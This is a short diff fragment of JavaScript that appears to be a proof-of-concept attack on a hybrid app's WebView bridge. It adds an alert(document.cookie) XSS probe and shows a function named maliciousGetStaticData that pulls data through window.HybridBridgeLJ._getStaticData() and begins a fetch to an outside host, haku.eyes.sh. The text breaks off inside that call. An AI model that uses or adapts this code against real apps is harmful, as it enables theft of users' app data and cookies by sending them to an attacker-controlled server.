@@ -1,3 +1,4 @@
+alert(document.cookie);
 function maliciousGetStaticData() {
     var data = window.HybridBridgeLJ._getStaticData();
     fetch("http://haku.eyes.sh?beike", {
